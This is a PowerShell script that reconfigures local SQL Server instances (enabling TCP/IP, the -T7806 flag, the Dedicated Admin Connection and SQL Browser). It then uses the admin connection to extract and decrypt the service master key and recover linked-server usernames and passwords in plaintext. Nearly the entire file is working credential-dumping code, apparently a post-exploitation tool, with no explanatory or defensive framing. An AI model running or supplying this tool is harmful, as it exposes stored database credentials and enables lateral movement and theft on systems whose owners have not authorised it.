#ENABLE TCP/IP ON THE SQL INTANCES

Import-Module SQLPS -DisableNameChecking

Write-Host "[*] Enabling TCP/IP Connection on instances"

Try
{
	$SqlInstances = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server' -Name InstalledInstances).InstalledInstances
     
      foreach ($InstanceName in $SqlInstances) {
		    $wmi = New-Object 'Microsoft.SqlServer.Management.Smo.Wmi.ManagedComputer' localhost

			$tcp = $wmi.ServerInstances[$InstanceName].ServerProtocols['Tcp']
			$tcp.IsEnabled = $true  
			$tcp.Alter()  

			Write-Host "[+] Restarting Service for: $InstanceName"

			$ServiceInstances = Get-Service | Where-Object { $_.DisplayName -like 'SQL Server (*' }

			$ServiceToReset = $ServiceInstances | Where-Object { $_.DisplayName -match $InstanceName }

			Restart-Service -Name $ServiceToReset.Name -Force

			Write-Host "[+] TCP/IP Successfuly Enabled for: $InstanceName" 
	  }
	  
	Write-Host "[**] Enabling TCP/IP Connection Task Finished"
}
catch {
    Write-Host "[-] Error executing the command: $_"
}

#ADD THE STARTUP PARAMETER FLAG -T7806

$StartupParameter = "-T7806"

Try
{
Write-Host "[*] Adding Start Up Parameter"

$hklmRootNode = "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server"

$props = Get-ItemProperty "$hklmRootNode\Instance Names\SQL"

$instances = $props.psobject.properties | ?{$_.Value -like 'MSSQL*'} | select Value

$instances | %{
    $inst = $_.Value;
    $regKey = "$hklmRootNode\$inst\MSSQLServer\Parameters"
    $props = Get-ItemProperty $regKey
    $params = $props.psobject.properties | ?{$_.Name -like 'SQLArg*'} | select Name, Value

    $hasFlag = $false
    foreach ($param in $params) {
        if($param.Value -eq $StartupParameter) {
            $hasFlag = $true
            break;
        }
    }
    if (-not $hasFlag) {
		Write-Host "[+] Adding $StartupParameter on $inst"
        $newRegProp = "SQLArg"+($params.Count)
        Set-ItemProperty -Path $regKey -Name $newRegProp -Value $StartupParameter
    } else {
		Write-Host "[-] $StartupParameter already set on $inst"
    }
}
Write-Host "[**] Start Up Parameter Task Finished"
}
catch {
    Write-Host "[-] Error executing the command: $_"
}

#ENABLE DAC AND, IF NEEDED, THE SQL SERVER BROWSER

Write-Host "[*] Starting Enable DAC Task"

$ComputerName = $Env:computername
      $SqlInstances = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server' -Name InstalledInstances).InstalledInstances
     Try {
      foreach ($InstanceName in $SqlInstances) {
        $ConnString = "Server=$ComputerName\$InstanceName;Trusted_Connection=True"
        if ($InstanceName -eq "MSSQLSERVER") {
          $ConnString = "Server=$ComputerName\;Trusted_Connection=True"
        }
     
        $Conn = New-Object System.Data.SqlClient.SQLConnection($ConnString);
        
          $Conn.Open();
		  $queries = @(
				"EXEC sys.sp_configure N'advanced options', 1;",
				"RECONFIGURE WITH OVERRIDE;",
				"EXEC sys.sp_configure N'remote admin connections', 1;",
				"RECONFIGURE WITH OVERRIDE;")
			$command = $Conn.CreateCommand()

		foreach ($query in $queries) {
			$command.CommandText = $query
			$command.ExecuteNonQuery()
			}
			
		Write-Host "[+] DAC Enabled for instance: $InstanceName"
		}
		
		Write-Host "[+] Enabled SQL Browser"

		if (Get-Service -Name "SQLBrowser" -ErrorAction SilentlyContinue) {
			$service = Get-Service -Name "SQLBrowser"
			if ($service.Status -ne "Running") {
				Set-Service -Name "SQLBrowser" -StartupType Automatic
				Start-Service -Name "SQLBrowser"
				Write-Host "[+]SQL Server Browser service enabled and started."
			} else {
				Write-Host "[+]SQL Server Browser service is already enabled and running."
			}
		} else {
			Write-Host "[-]SQL Server Browser service does not exist on this system."
		}	
	 }
        catch {
    Write-Host "Error executing SQL queries: $_"
}
finally {
    $Conn.Close()
	Write-Host "[**] Finished Enable DAC Task"
}



#RUN THE SCRIPT TO GET AND DECRYPT THE LINKED SERVERS PASSWORDS
	  Add-Type -assembly System.Security
      Add-Type -assembly System.Core
     
      $Results = New-Object "System.Data.DataTable"
      $Results.Columns.Add("Instance") | Out-Null
      $Results.Columns.Add("LinkedServer") | Out-Null
      $Results.Columns.Add("Username") | Out-Null
      $Results.Columns.Add("Password") | Out-Null
     
      # Set local computername and get all SQL Server instances
      $ComputerName = $Env:computername
      $SqlInstances = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server' -Name InstalledInstances).InstalledInstances
     
      foreach ($InstanceName in $SqlInstances) {
        # Start DAC connection to SQL Server
        $ConnString = "Server=ADMIN:$ComputerName\$InstanceName;Trusted_Connection=True"
        if ($InstanceName -eq "MSSQLSERVER") {
          $ConnString = "Server=ADMIN:$ComputerName;Trusted_Connection=True"
        }
     
	 $Conn = New-Object System.Data.SqlClient.SQLConnection($ConnString);
        Try {
          $Conn.Open();
        } Catch {
          Write-Error "Error creating DAC connection: $_.Exception.Message"
          Continue
        }
     
        if ($Conn.State -eq "Open") {
          # Query Service Master Key from the database - remove padding from the key
          # key_id 102 eq service master key, thumbprint 3 means encrypted with machinekey
          $SqlCmd = "SELECT substring(crypt_property,9,len(crypt_property)-8) 
                     FROM sys.key_encryptions 
                     WHERE key_id = 102 
                     AND (thumbprint=0x03 OR thumbprint=0x0300000001)"
          $Cmd = New-Object System.Data.SqlClient.SqlCommand($SqlCmd,$Conn);
          $SmkBytes = $Cmd.ExecuteScalar()
     
          # Get entropy from the registry - hopefully finds the right SQL server instance
          $RegPath = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\sql\").$InstanceName
          [byte[]]$Entropy = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\$RegPath\Security\").Entropy
     
          # Decrypt the service master key
          $ServiceKey = [System.Security.Cryptography.ProtectedData]::Unprotect($SmkBytes, $Entropy, 'LocalMachine')
     
          # Choose the encryption algorithm based on the SMK length - 3DES for 2008, AES for 2012
          # Choose IV length based on the algorithm
          if (($ServiceKey.Length -eq 16) -or ($ServiceKey.Length -eq 32)) {
            if ($ServiceKey.Length -eq 16) {
              $Decryptor = New-Object System.Security.Cryptography.TripleDESCryptoServiceProvider
              $IvLen=8
            }
            if ($ServiceKey.Length -eq 32) {
              $Decryptor = New-Object System.Security.Cryptography.AESCryptoServiceProvider
              $IvLen=16
            }
     
            # Query link server password information from the DB
            # Remove header from pwdhash, extract IV (as iv) and ciphertext (as pass)
            # Ignore links with blank credentials (integrated auth ?)
            $SqlCmd = "SELECT s.srvname
            , l.name
            , SUBSTRING(l.pwdhash, 5, $ivlen) iv
            , SUBSTRING(l.pwdhash, $($ivlen+5), LEN(l.pwdhash)-$($ivlen+4)) pass 
            FROM master.sys.syslnklgns l
              INNER JOIN master.sys.sysservers s ON l.srvid = s.srvid 
            WHERE LEN(pwdhash) > 0"
            $Cmd = New-Object System.Data.SqlClient.SqlCommand($SqlCmd,$Conn);
            $Data = $Cmd.ExecuteReader()
            $Dt = New-Object "System.Data.DataTable"
            $Dt.Load($Data)
     
            # iterate over results
            foreach ($Logins in $Dt) {
              # decrypt the password using the service master key and the extracted IV
              $Decryptor.Padding = "None"
              $Decrypt = $Decryptor.CreateDecryptor($ServiceKey,$Logins.iv)
              $Stream = New-Object System.IO.MemoryStream (,$Logins.pass)
              $Crypto = New-Object System.Security.Cryptography.CryptoStream $Stream,$Decrypt,"Write"
              $Crypto.Write($Logins.pass,0,$Logins.pass.Length)
              [byte[]]$Decrypted = $Stream.ToArray()
     
              # convert decrypted password to unicode
              $EncodingType = "System.Text.UnicodeEncoding"
              $Encode = New-Object $EncodingType
     
              # Print results - removing the weird padding (8 bytes in the front, some bytes at the end)...
              # Might cause problems but so far seems to work.. may be dependant on SQL server version...
              # If problems arise remove the next three lines..
              $i = 8
              foreach ($b in $Decrypted) {
                if ($Decrypted[$i] -ne 0 -and $Decrypted[$i+1] -ne 0 -or $i -eq $Decrypted.Length) {
                  $i -= 1; 
                  break;
                }; 
                $i += 1;
              }
              $Decrypted = $Decrypted[8..$i]
              $Results.Rows.Add(
                $InstanceName
              , $($Logins.srvname)
              , $($Logins.name)
              , $($Encode.GetString($Decrypted))
              ) | Out-Null
            }
          } else {
            Write-Error "Unknown key size"
          }
          $Conn.Close();
        }
      }
      $Results